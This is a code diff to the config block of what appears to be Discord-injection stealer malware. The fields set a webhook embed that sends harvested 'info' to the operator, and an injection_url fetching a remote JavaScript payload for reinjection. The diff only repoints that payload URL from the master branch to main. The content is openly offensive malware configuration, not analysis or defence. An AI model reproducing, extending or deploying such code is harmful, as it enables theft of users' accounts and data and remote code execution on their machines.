@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Inject', //name of the webhook thats gonna send the info
   embed_icon: "https://media.discordapp.net/attachments/867105850502283325/992149452037034094/unknown.png?width=455&height=479", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/entity9/test/master/sussington.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/entity9/test/main/sussington.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
